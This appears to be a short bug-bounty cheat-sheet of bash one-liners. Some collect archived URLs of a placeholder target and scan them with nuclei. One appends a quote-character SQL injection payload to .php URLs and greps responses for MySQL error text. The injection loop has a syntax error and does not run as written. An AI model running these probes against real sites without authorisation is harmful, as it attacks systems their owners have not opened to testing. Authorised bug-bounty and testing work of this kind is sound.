# Simple 1Line #BASH For #BugBounty.

```waybackurls TARGET.COM | grep = | tee urls.txt | nuclei -dast```

```gau TARGET.COM | grep = | tee urls.txt | nuclei -dast```


# 1Line BASH To Perform #SQL_Injection For BugBounties.

```cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable to SQLI Injection\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done```
